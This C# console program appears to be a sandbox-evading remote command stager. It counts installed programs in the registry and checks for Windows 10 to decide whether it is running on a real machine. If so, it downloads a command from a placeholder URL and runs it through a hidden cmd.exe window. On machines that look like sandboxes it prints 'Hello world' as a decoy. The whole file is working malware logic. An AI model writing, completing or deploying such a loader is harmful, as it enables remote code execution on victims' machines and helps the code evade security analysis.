using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;
namespace cau
{
    class Program
    {
        
        static void Main(string[] args)
        {
            var osName = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName","").ToString();
            Console.WriteLine(osName);
            
            int s = soft();
            if((osName.Contains("Windows 10"))&&(s>250))
             {
                var cur = WindowsIdentity.GetCurrent();
                if (cur.Groups != null)
                    foreach (var role in cur.Groups)
                        if (role.IsValidTargetType(typeof(SecurityIdentifier)))
                        {
                            var sid = (SecurityIdentifier)role.Translate(typeof(SecurityIdentifier));
                            if (sid.IsWellKnown(WellKnownSidType.AccountAdministratorSid) ||
                                sid.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid))
                                Console.WriteLine("ADMIN");
                        }

                Console.WriteLine("Not admin");
                string command = new WebClient().DownloadString("### website link which return command  ###");
                Console.WriteLine("No sandbox");
                Console.WriteLine("Command:"+command);
                Process cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.Start();

                cmd.StandardInput.WriteLine(command);
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                cmd.WaitForExit();
                Console.WriteLine(cmd.StandardOutput.ReadToEnd());
                

            }
            else
            {
                Console.WriteLine("Hello world");
            }
            Console.ReadLine();
        }
        public static int soft()
        {
            int i = 0;
            string uninstallKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
            using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(uninstallKey))
            {
                foreach (string skName in rk.GetSubKeyNames())
                {
                    using (RegistryKey sk = rk.OpenSubKey(skName))
                    {
                        try
                        {

                            var displayName = sk.GetValue("DisplayName");
                            var size = sk.GetValue("EstimatedSize");

                            if (displayName != null)
                            {
                              //  Console.WriteLine("Name :" + displayName + "  Size:" + size);
                                i++;
                            }
                        }
                        catch (Exception)
                        { }
                    }
                }
                
            }
            return i;
        }
       
    }
}
